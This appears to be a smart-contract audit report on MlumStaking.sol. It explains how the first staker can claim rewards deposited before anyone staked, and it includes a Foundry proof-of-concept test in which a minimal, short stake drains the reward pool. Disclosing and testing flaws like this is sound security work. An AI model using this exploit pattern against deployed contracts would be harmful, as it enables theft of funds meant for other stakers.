# Malicious user can drain entire rewards balance

## Summary
If rewards are added before any deposit is made, the first depositer can drain the entire reward that was deposited before they made their deposit.

## Vulnerability Detail
`MlumStaking.sol`  calculates reward based on `rewardDebt`,  `_accRewardsPerShare` and other varibales. The issue arises when the protocol decides to deposit into the contract before any deposit is made, then the first person to deposit the staking token into the contract will be allocated all the rewards that was previously deposited regardless of the length of duration or size of the deposit and can withdraw it at anytime they want as far as there is a second deposit to update the contract which they can perform the second deposit transaction by themselves.
Vulnerability Flow :
Dev deploys contract and deposits reward tokens into the contract
Bob deposits into the contract since staked token is zero _update is skipped
Bob or another user (Alice) deposits into the contract making updating the contract in Bob's favour.

Again Bob can withdraw this anytime he wants 

I logged out some values after I tweaked `MlumStaking.t.sol` , so you'll run these tests in the test contract 

`function testHarvest() public {
    _rewardToken.mint(address(_pool), 100_000_000);
        _stakingToken.mint(ALICE, 2 ether);
        _stakingToken.mint(BOB, 2 ether);
_stakingToken.mint(CANDY, 2 ether);
                skip(5);

 // first depositer 
 vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(0.0001 ether, 1 days);
        vm.stopPrank();

skip(1);
// alice second depositer 
        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 365 days);
        vm.stopPrank();
        
        skip(1);
           vm.startPrank(CANDY);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 365 days);
        vm.stopPrank();

        skip(10 days);
// alice tries to claim withdraw rewards
        vm.prank(ALICE);
        _pool.harvestPosition(2);

        console.log(_rewardToken.balanceOf(ALICE), "alice reward balance");
       
// candy too tries to withdraw rewards
        skip(1 days);
        vm.prank(CANDY);
        _pool.harvestPosition(3);
console.log(_rewardToken.balanceOf(CANDY), "CANDY reward balance");

skip(1 days);
// bob then comes to withdraw rewards
vm.prank(BOB);
_pool.harvestPosition(1);
console.log(_rewardToken.balanceOf(BOB), "BOB reward balance");
console.log(_rewardToken.balanceOf(address(_pool)), "pool reward balance");
}
`  

As we can see Bob carries all the first withdrawal with minimal stake and minimal duration 


## Impact
Entire protocol rewards meant fpor multiple users  can be drained and this can be done with very little funds .

## Tool used

Manual Review

## Recommendation
The reward system should be re-evaluated in respect to this  because the recomendation I'm thinking of will introduce new bugs.

The sponsors might argue that they won't deposit at that time but this was not listed as a known issue
